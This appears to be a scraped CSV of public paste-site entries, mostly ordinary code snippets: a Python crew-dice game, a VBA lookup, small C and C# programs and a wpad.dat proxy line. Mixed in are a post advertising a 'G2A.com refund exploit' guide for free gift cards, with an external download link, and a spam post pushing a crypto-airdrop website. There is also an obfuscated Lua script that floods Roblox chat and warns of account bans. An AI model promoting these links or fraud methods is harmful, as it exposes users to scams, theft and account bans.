id,title,username,language,date,content
AdZkKjQV,data801,TestGuy1,JSON,Tuesday 2nd of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2442049ce048269b11982e40aa7ac4a2d07163cbda656fdb373678e31caf3b04f08e322342e5bb243b01ad7616432113a4feef596ef53bef99c906af1ff0353976b395b55eae684259e8e3823fa6a8519b918782f4527006ce83e5068a0805579c9b1638679a24078dba828147c0b85e91dbb1e69fff531f2a69fc0172c0dc3f',
  otherdata: [
    '0ed98e1b271b815c3c2eae99db78a66a',
    'fde3564714628522c9d7b18da1a22b3e',
    '4af8de5f731e93e6a2644793d3144090',
    '0bc9d80c4d976a948c1b64be3bd13f6d',
    'a2b90bac982e237f60c5ef2990ed9d7b',
    'e02219c820c58e768a7374e3ee650498',
    '38133a9a1a28ff95f97f92d40b5dbcf8',
    '4e008e8658bf2a44380aaa686bfcddbb'
  ]
}"
BffnFkHt,wpad.dat,vojuara,JavaScript,Tuesday 2nd of January 2024 05:48:20 AM CDT,"function FindProxyForURL(url, host) { return ""PROXY 192.168.1.1:8080""; }';"
n4NZTJDS,pretty_shown_crew,angeldp,Python,Tuesday 2nd of January 2024 05:40:02 AM CDT,"def pretty_shown_crew(crew):
    """"""
    Shows crew and threat as a ASCII dice roll

    Parameters
    ----------
    crew : array or int
        Result of the dice roll.

    Returns
    -------
    None.

    """"""
    # Threat's dice sides in ascii
    PRETTY_DICE = {
        1: (
            ""┌─────────┐"",
            ""│         │"",
            ""│    ●    │"",
            ""│         │"",
            ""└─────────┘"",
        ),
        2: (
            ""┌─────────┐"",
            ""│  ●      │"",
            ""│         │"",
            ""│      ●  │"",
            ""└─────────┘"",
        ),
        3: (
            ""┌─────────┐"",
            ""│  ●      │"",
            ""│    ●    │"",
            ""│      ●  │"",
            ""└─────────┘"",
        ),
        4: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│         │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
        5: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│    ●    │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
        6: (
            ""┌─────────┐"",
            ""│  ●   ●  │"",
            ""│  ●   ●  │"",
            ""│  ●   ●  │"",
            ""└─────────┘"",
        ),
    }
    # Crew dice sides in ascii
    PRETTY_CREW = {
        1: (
            ""┌─────────┐"",
            ""│  \\\\ //  │"",  # SCAPE \
            ""│   \\▼/   │"",   # SCAPE \
            ""│   └│┘   │"",
            ""│    ║   1│"",
            ""└─────────┘"",
        ),
        2: (
            ""┌─────────┐"",
            ""│    ▲    │"",
            ""│   /█\\   │"",   # SCAPE \
            ""│    ║    │"",
            ""│    │   2│"",
            ""└─────────┘"",
        ),
        3: (
            ""┌─────────┐"",
            ""│   ╞█╡   │"",
            ""│ ╞█► ◄█╡ │"",
            ""│   ╞█╡   │"",
            ""│        3│"",
            ""└─────────┘"",
        ),
        4: (
            ""┌─────────┐"",
            ""│   O__   │"",
            ""│    __ ● │"",
            ""│ ╔╗/     │"",
            ""│ ╚╝     4│"",
            ""└─────────┘"",
        ),
        5: (
            ""┌─────────┐"",
            ""│ ╔╪╗     │"",
            ""│ ╠ ╣     │"",
            ""│ ╚╪╝ ╔╗  │"",
            ""│     ╚╝ 5│"",
            ""└─────────┘"",
        ),
        6: (
            ""┌────╥────┐"",
            ""│    ║    │"",
            ""│   ╔╩╗   │"",
            ""│   ║☺║   │"",
            ""│   ╚═╝  6│"",
            ""└─────────┘"",
        ),
    }

    # If the function receives an array, use the crew dice.
    if isinstance(crew, list):
        DICE = PRETTY_CREW
        DICE_ROWS = len(DICE[1])
        DICE_SEP = ' '
        pretty_faces = []
        for n in crew:
            pretty_faces.append(DICE[n])
            dice_faces_rows = []
            for row_id in range(DICE_ROWS):
                row_components = []
                for die in pretty_faces:
                    row_components.append(die[row_id])
                row_string = DICE_SEP.join(row_components)
                dice_faces_rows.append(row_string)
        width = len(dice_faces_rows[0])
        diagram_header = "" CREW "".center(width, ""~"")
        dice_faces_diagram = ""\n"".join([diagram_header] + dice_faces_rows)
    # If the function receives an integer, it uses traditional dice.
    if isinstance(crew, int):
        DICE = PRETTY_DICE
        DICE_ROWS = len(DICE[1])
        DICE_SEP = ' '
        pretty_faces = []
        pretty_faces.append(DICE[1])
        dice_faces_rows = []
        for row_id in range(DICE_ROWS):
            row_components = []
            for die in pretty_faces:
                row_components.append(die[row_id])
            row_string = DICE_SEP.join(row_components)
            dice_faces_rows.append(row_string)
        width = len(dice_faces_rows[0])
        diagram_header = "" THREAT "".center(width, ""~"")
        dice_faces_diagram = ""\n"".join([diagram_header] + dice_faces_rows)
    # the result is shown
    print(f""{dice_faces_diagram}\n"")
"
8zJWayYW,BIG TEXT CHAT,Vincent_Ablat,Lua,Tuesday 2nd of January 2024 05:38:16 AM CDT,"--Big Text Chat
local textToChat = 'BOYKISSER' -- what to chat with big text
-- ⚠️WARNING | I AM NOT RESPONSIBLE IF YOUR ACCOUNT GETS BANNED! PLEASE USE THIS ON AN ALT ACCOUNT!

local v0={};string.lower(textToChat):gsub(""."",function(v8)table.insert(v0,v8);end);local v1="""";local v2="""";local v3="""";local v4="""";local v5="""";local v6="""";local v7="""";for v9,v10 in ipairs(v0) do local v11=1047 -(67 + 980) ;while true do if (v11==(1476 -(1329 + 145))) then if (v10==""f"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴⬛⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""g"") then local v13=0;while true do if (v13==(972 -(140 + 831))) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v13=2;end if (v13==(1852 -(1409 + 441))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v13=3;end if (v13==(721 -(15 + 703))) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v13==(0 + 0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v13=439 -(262 + 176) ;end end end if (v10==""h"") then local v14=0;while true do if (1==v14) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v14=1723 -(345 + 1376) ;end if (v14==(688 -(198 + 490))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v14=4 -3 ;end if (v14==(4 -2)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v14=1209 -(696 + 510) ;end if (v14==(5 -2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end v11=1265 -(1091 + 171) ;end if (v11==8) then if (v10==""y"") then local v15=0;while true do if (1==v15) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v15=1 + 1 ;end if (v15==0) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v15=3 -2 ;end if (v15==2) then v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v15=9 -6 ;end if (v15==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""z"") then local v16=0;while true do if (v16==(376 -(123 + 251))) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v16=3;end if (v16==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v16=1;end if (v16==1) then v3=v3   .. ""⬛⬛⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v16=700 -(208 + 490) ;end if (v16==(1 + 2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end break;end if (v11==5) then if (v10==""o"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""p"") then local v17=0 + 0 ;while true do if (1==v17) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v17=838 -(660 + 176) ;end if (v17==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v17==0) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v17=1;end if ((1 + 1)==v17) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴⬛⬛"" ;v17=205 -(14 + 188) ;end end end if (v10==""q"") then v1=v1   .. ""⬛⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛🔴⬛🔴⬛"" ;v4=v4   .. ""⬛🔴⬛🔴⬛"" ;v5=v5   .. ""⬛🔴🔴🔴⬛"" ;v6=v6   .. ""⬛🔴🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛⬛"" ;end v11=6;end if (v11==0) then if (v10=="" "") then local v18=675 -(534 + 141) ;while true do if (v18==(2 + 1)) then v7=v7   .. ""⬛"" ;break;end if (v18==(1 + 0)) then v3=v3   .. ""⬛"" ;v4=v4   .. ""⬛"" ;v18=2 + 0 ;end if (0==v18) then v1=v1   .. ""⬛"" ;v2=v2   .. ""⬛"" ;v18=1 -0 ;end if (2==v18) then v5=v5   .. ""⬛"" ;v6=v6   .. ""⬛"" ;v18=3;end end end if (v10==""a"") then local v19=0 -0 ;while true do if (v19==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v19=1 + 0 ;end if (v19==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v19=2 + 0 ;end if (v19==(398 -(115 + 281))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v19=6 -3 ;end if (v19==(3 + 0)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""b"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴⬛"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=1;end if (v11==(7 -4)) then if (v10==""i"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛⬛🔴⬛"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""j"") then local v20=0;while true do if (v20==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v20=1;end if (v20==2) then v5=v5   .. ""⬛⬛⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v20=870 -(550 + 317) ;end if (v20==1) then v3=v3   .. ""⬛⬛⬛🔴"" ;v4=v4   .. ""⬛⬛⬛🔴"" ;v20=2 -0 ;end if (v20==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""k"") then local v21=0;while true do if (v21==(2 -0)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v21=3;end if (v21==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴⬛"" ;v21=5 -3 ;end if ((285 -(134 + 151))==v21) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛⬛"" ;v21=1;end if (v21==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end v11=1669 -(970 + 695) ;end if (v11==(11 -5)) then if (v10==""r"") then local v22=1990 -(582 + 1408) ;while true do if (v22==(10 -7)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if ((1 -0)==v22) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v22=7 -5 ;end if (v22==(1826 -(1195 + 629))) then v5=v5   .. ""⬛🔴🔴⬛"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v22=3 -0 ;end if (v22==(241 -(187 + 54))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v22=781 -(162 + 618) ;end end end if (v10==""s"") then local v23=0 + 0 ;while true do if (v23==(2 + 0)) then v5=v5   .. ""⬛⬛⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v23=6 -3 ;end if ((1 -0)==v23) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v23=1 + 1 ;end if ((1636 -(1373 + 263))==v23) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v23=1001 -(451 + 549) ;end if (v23==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""t"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v3=v3   .. ""⬛⬛🔴⬛"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛⬛🔴⬛"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=3 + 4 ;end if (v11==1) then if (v10==""c"") then local v24=0 -0 ;while true do if (v24==2) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛⬛🔴🔴"" ;v24=3;end if ((1 -0)==v24) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛⬛"" ;v24=2;end if ((1384 -(746 + 638))==v24) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛⬛🔴🔴"" ;v24=1 + 0 ;end if (v24==(4 -1)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""d"") then local v25=341 -(218 + 123) ;while true do if (v25==(1581 -(1535 + 46))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴⬛"" ;v25=1;end if (v25==2) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴⬛"" ;v25=3 + 0 ;end if (v25==1) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v25=1 + 1 ;end if (v25==(563 -(306 + 254))) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""e"") then local v26=0 + 0 ;while true do if (v26==(0 -0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v26=1;end if (v26==(1468 -(899 + 568))) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴🔴🔴"" ;v26=2;end if (v26==3) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v26==2) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v26=2 + 1 ;end end end v11=4 -2 ;end if (v11==(610 -(268 + 335))) then if (v10==""u"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end if (v10==""v"") then local v27=0;while true do if (v27==(290 -(60 + 230))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v27=1;end if (v27==(573 -(426 + 146))) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v27=1 + 1 ;end if (v27==(1458 -(282 + 1174))) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛⬛🔴⬛"" ;v27=814 -(569 + 242) ;end if (3==v27) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end end end if (v10==""x"") then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛🔴"" ;v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛⬛🔴⬛"" ;v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v7=v7   .. ""⬛⬛⬛⬛"" ;end v11=8;end if (v11==4) then if (v10==""l"") then local v28=0 -0 ;while true do if (v28==(1 + 1)) then v5=v5   .. ""⬛🔴⬛⬛"" ;v6=v6   .. ""⬛🔴🔴🔴"" ;v28=1027 -(706 + 318) ;end if ((1252 -(721 + 530))==v28) then v3=v3   .. ""⬛🔴⬛⬛"" ;v4=v4   .. ""⬛🔴⬛⬛"" ;v28=1273 -(945 + 326) ;end if (v28==(7 -4)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v28==(0 + 0)) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴⬛⬛"" ;v28=701 -(271 + 429) ;end end end if (v10==""m"") then local v29=0 + 0 ;while true do if ((1502 -(1408 + 92))==v29) then v5=v5   .. ""⬛🔴⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴⬛🔴"" ;v29=1089 -(461 + 625) ;end if (v29==3) then v7=v7   .. ""⬛⬛⬛⬛⬛⬛"" ;break;end if ((1288 -(993 + 295))==v29) then v1=v1   .. ""⬛⬛⬛⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴🔴⬛"" ;v29=1;end if (v29==1) then v3=v3   .. ""⬛🔴⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴⬛🔴"" ;v29=2;end end end if (v10==""n"") then local v30=0 + 0 ;while true do if (v30==(1171 -(418 + 753))) then v1=v1   .. ""⬛⬛⬛⬛"" ;v2=v2   .. ""⬛🔴🔴🔴"" ;v30=1 + 0 ;end if ((1 + 0)==v30) then v3=v3   .. ""⬛🔴⬛🔴"" ;v4=v4   .. ""⬛🔴⬛🔴"" ;v30=2;end if (v30==(1 + 2)) then v7=v7   .. ""⬛⬛⬛⬛"" ;break;end if (v30==(1 + 1)) then v5=v5   .. ""⬛🔴⬛🔴"" ;v6=v6   .. ""⬛🔴⬛🔴"" ;v30=3;end end end v11=5;end end end function v31(v12) if game then game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v12,""All""); wait(.01); else print(v12) end end v1=v1   .. ""⬛"" ;v2=v2   .. ""⬛"" ;v3=v3   .. ""⬛"" ;v4=v4   .. ""⬛"" ;v5=v5   .. ""⬛"" ;v6=v6   .. ""⬛"" ;v7=v7   .. ""⬛"" ;v31(v1);v31(v2);v31(v3);v31(v4);v31(v5);v31(v6);v31(v7);"
g7k9NBVr,clear_screen,angeldp,Python,Tuesday 2nd of January 2024 05:37:36 AM CDT,"def clear_screen():
    """"""
    Clear the user screen based on the operating system used

    Returns
    -------
    None.

    """"""

    if name == ""posix"":
        system(""clear"")
    elif name == ""ce"" or name == ""nt"" or name == ""dos"":
        system(""cls"")"
CagzK9zg,commander,angeldp,Python,Tuesday 2nd of January 2024 05:27:13 AM CDT,"def commander(crew):
    """"""
    Actions to perform with each '1' obtained in the roll.
    It must ask if you want to change any crew member or re-roll
    available crew.
    It will need to validate all user input.
    It needs the crew array and returns it modified

    Parameters
    ----------
    crew : array
        Result of the dice roll.

    Returns
    -------
    crew : array
        Dice roll result modified by commander.

    """"""

    print('Commander available:')
    # The key pressed by the user is stored in 'c'.
    c = 'x'
    oldcrew = ''
    # Prompt until a valid value is obtained
    while c.lower() != 'c' and c.lower() != 'r':
        c = input(""Do you want to change any members of your crew (c) \n \
        or re-roll de dice (r)? c/r\n"")
    if c.lower() == 'c':
        # At this point 'c' is used to validate that the number is on the
        # 'crew' (an unavailable crew member cannot be changed)
        c = 'n'
        while c == 'n':
            # 'cont' stores the position in the array in which
            # the indicated value is located
            cont = 0
            oldcrew = int(input(""Number of the crew member to be replaced:""))
            # If a 6 (scanner) has been indicated, it moves on to the next
            # iteration without doing anything else (continues requesting
            # a crew member until a valid value is received)
            if oldcrew == 6:
                continue
            for i in crew:
                if i == oldcrew:
                    # If the entered value is available, the new value is
                    # requested, making sure that a value between 2 and 5
                    # was indicated.
                    newcrew = 1
                    while newcrew < 2 or newcrew > 5:
                        newcrew = int(
                            input(""Value of the new crew member (2-5)""))
                    crew[cont] = newcrew
                    # 'c' is updated to stop prompting.
                    c = ''
                    break
                cont += 1
    elif c.lower() == 'r':
        ncrew = []
        cont = 0
        while cont < len(crew):
            if crew[cont] == 1 or crew[cont] == 6:
                ncrew.append(crew[cont])
            else:
                ncrew.append(randint(1, 6))
            cont += 1
        # Crew update
        crew = ncrew
    if c == 'c':
        print(f'Successfully changed {oldcrew} to {newcrew}')
    print(f""Nueva tripulación: {crew}"")
    pretty_shown_crew(crew)
    return crew"
qJKNvR3P,Search nearest number,Dotterbart,VisualBasic,Tuesday 2nd of January 2024 05:16:22 AM CDT,"Function SearchNearest(intSearch As Integer) As Integer
Dim DB As DAO.Database
Dim RS As DAO.Recordset
Dim strSQL, strMax, strMin As String
Dim intMax, intMin As Integer
Dim intDifMax, intDifMin As Integer

Set DB = CurrentDb

strSQL = ""SELECT TOP 1 BuchArtikel_ID FROM Buchung WHERE BuchArtikel_ID <= "" & CStr(intSearch) & "" ORDER BY Buchung.BuchArtikel_ID DESC;""
Set RS = DB.OpenRecordset(strSQL)
If RS.RecordCount > 0 Then
    intMin = RS!BuchArtikel_ID
Else
    intMin = 0
End If

strSQL = ""SELECT TOP 1 BuchArtikel_ID FROM Buchung WHERE BuchArtikel_ID >= "" & CStr(intSearch) & "" ORDER BY Buchung.BuchArtikel_ID ASC;""
Set RS = DB.OpenRecordset(strSQL)

If RS.RecordCount > 0 Then
    intMax = RS!BuchArtikel_ID
Else
    intMax = 0
End If

intDifMax = (intSearch - intMax) * -1
intDifMin = intSearch - intMin
Debug.Print intDifMax
Debug.Print intDifMin

If intDifMin > intDifMax Then
    SearchNearest = intMax
Else
    SearchNearest = intMin
End If

RS.Close
DB.Close
Set DB = Nothing
Set RS = Nothing
End Function"
HLUev3UH,Untitled,dllbridge,C,Tuesday 2nd of January 2024 05:14:48 AM CDT,"


#include   <stdio.h>
#include  <string.h>    


char sz1[123] = ""SONY"",
     sz2[123] = "" ONE, Two"";
	   
	   
	   
//////////////////////////////////////////////////////	   
void _strcpy(char *p1, char *p2)
{
     int n = strlen(p2);
     
     for(int i = 0; i < n; i++)
     {
       
         sz1[i] = sz2[i];
	 }
     sz1[n] = 0;
}
	   
	   
	   
	   
 
//////////////////////////////////////////////////////
int main()
{
	
	_strcpy(sz1, sz2);

			 	
    printf(""%s \n"", sz1); 	
  
return 0;
}

"
VdNnbh8q,List of all FREE Crypto Airdrops!,VQ-Moe,GetText,Tuesday 2nd of January 2024 05:10:05 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
We have a solution - https://netdrop.netlify.app/

Join 100,000+ people claiming crypto airdrops on all available networks.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

BT316461"
WSFuTtRp,main_program,angeldp,Python,Tuesday 2nd of January 2024 05:02:34 AM CDT,"def main_program(deck, scant, crewn):
    """"""
    Main program

    Parameters
    ----------
    deck : array
        Deck of threat cards
    scant : int
        Busy scanners number from 0 to 2
    crewn : int
        Available crew members from 0 to 6

    Returns
    -------
    int
        0 without error.

    """"""
    i = 0
    while len(deck) > 0:
        clear_screen()
        print(f'Round #{i + 1}')
        print(""\nStep 1: Roll all available Crew Dice"")
        crew = generate_crew(crewn)
        print(crew)
        pretty_shown_crew(crew)
        scant = scan_threats(crew, scant, deck)
        print(""\nStep 2: Assign scanners"")
        print(f""You have {scant} scanners in use"")
        print(""\nStep 3: Assign Crew"")
        assign_crew(crew)
        print(crew)
        print(""\nStep 4: Draw a new threat card"")
        deck = new_threat(deck)
        print(f""{len(deck)} card(s) remaining"")
        print(""\nStep 5: Roll threat die"")
        activate_threat()
        print(""\nStep 6:Gather all available Crew"")
        crewn = 6 - scant
        if crewn < 1:
            print('You lost!')
            return 0
        print(f""{crewn} crew members available\n"")
        i += 1
        input(""Press enter to start the next round\n"")
    print('Won!')
    input('Press enter to exit')
    return 0"
UuCRzzwN,activate_threat,angeldp,Python,Tuesday 2nd of January 2024 04:55:56 AM CDT,"def activate_threat():
    """"""
    To Be Developed

    Returns
    -------
    None.

    """"""
    threat_dice = randint(1, 6)
    print(f'trigger threats corresponding to the number {threat_dice}')
    pretty_shown_crew([threat_dice])"
mYh3dJzL,new_threat,angeldp,Python,Tuesday 2nd of January 2024 04:52:01 AM CDT,"def new_threat(deck):
    """"""
    To Be Developed

    Parameters
    ----------
    deck : array
        Deck of threat cards in play.

    Returns
    -------
    deck: array
        Updated deck

    """"""
    deck.remove(deck[0])
    print('We get a threat card from the deck')
    return deck"
kWbuuEdg,assign_crew,angeldp,Python,Tuesday 2nd of January 2024 04:33:33 AM CDT,"def assign_crew(crew):
    """"""
    If there are commanders in the roll, it is responsible for updating the
    crew and, in any case, calls the functions of each crew member with
    the number of them available.

    Parameters
    ----------
    crew : array
        Result of the dice roll.

    Returns
    -------
    None.

    """"""
    # The new crew
    ncrew = []
    # Number of crew members of each type
    tacticn = 0
    doctorn = 0
    scientistn = 0
    engineern = 0
    # in search of the commander
    for i in range(len(crew)):
        if crew[i] == 1:
            ncrew = commander(crew)
    # Crew update if modified
    if len(ncrew) != 0:
        crew = ncrew
    # For the rest of the tasks, the appropriate functions are called
    # with the number of crew members of each type.
    for i in range(len(crew)):
        if crew[i] == 2:
            tacticn += 1
        elif crew[i] == 3:
            doctorn += 1
        elif crew[i] == 4:
            scientistn += 1
        elif crew[i] == 5:
            engineern += 1
    if tacticn > 0:
        tactic(tacticn)
    if doctorn > 0:
        doctor(doctorn)
    if scientistn > 0:
        scientist(scientistn)
    if engineern > 0:
        engineer(engineern)"
SWPvirax,scan_threats,angeldp,Python,Tuesday 2nd of January 2024 04:12:49 AM CDT,"def scan_threats(crew, scant, deck):
    """"""
    loops through the 'crew' array to get the number of sixes.
    If 'scant' plus that number is less than 3 the variable 'scant'
    is updated; If it is equal to or greater than 3, it calculates
    the module of that value between 3 and saves it in 'scant'
    and draws a new threat card [new_threat()].
    It will have to do this as many times as the integer part
    indicates by dividing the number of scanners by 3

    Parameters
    ----------
    crew : array
        Result of the dice roll.
    scant : int
        Number of busy scanners. Value between 0 and 2.
    Returns
    -------
    scant : int
        Updated number of busy scanners. Value between 0 and 2.

    """"""
    # 'n6' will store the number of sixes in 'crew'
    n6 = 0
    for i in crew:
        if i == 6:
            n6 += 1
    # The number of scanners is updated
    scant = scant + n6

    # If 'scant' is equal to or greater than 3,
    # I draw as many threat cards as groups of 3
    # have been obtained and I update scant
    # with the rest of the division

    if scant >= 3:
        rango = scant // 3
        for n in range(rango):
            new_threat(deck)
        scant = scant % 3

    return scant"
msW460Ki,generate_crew,angeldp,Python,Tuesday 2nd of January 2024 04:06:39 AM CDT,"def generate_crew(crewn):
    """"""
    Receives the number of active crew members (crewn)
    to complete with random values ​​between 1 and 6
    a crew sized array.

    Parameters
    ----------
    crewn : int
        Number of crew members (dice) in play.

    Returns
    -------
    crew : array
        Result of the dice roll.

    """"""
    
    # Loop through the array storing random values between 1 and 6
    crew = []
    for i in range(crewn):
        crew.append(randint(1, 6))
    return crew"
TR67CueY,Untitled,Legiomax,C#,Tuesday 2nd of January 2024 04:00:11 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Write(""Введите ваше имя: "");
            String name = Console.ReadLine();
            Console.Write(""Введите ваш возраст: "");
            byte age = Convert.ToByte(Console.ReadLine());
            Console.Write(""Введите ваш знак зодиака: "");
            String signZodiac = Console.ReadLine();
            Console.Write(""Введите ваш адрес проживания: "");
            String homeAddress = Console.ReadLine();
            Console.Write(""Введите кем вы работаете: "");
            String workJob = Console.ReadLine();
            Console.WriteLine(""Здравствуйте, Вас зовут "" + name + "" вам "" + age + "" лет, вы - "" +
                signZodiac + "" живёте по адресу: "" + homeAddress + "" и работаете "" + workJob + ""."");
            Console.ReadLine();
        }
    }
}
"
R7dpv75e,G2A.com Refund Exploit Jan 2024,G2ARefundExploit,GetText,Tuesday 2nd of January 2024 03:44:09 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_553836.pdf
 
Working as of
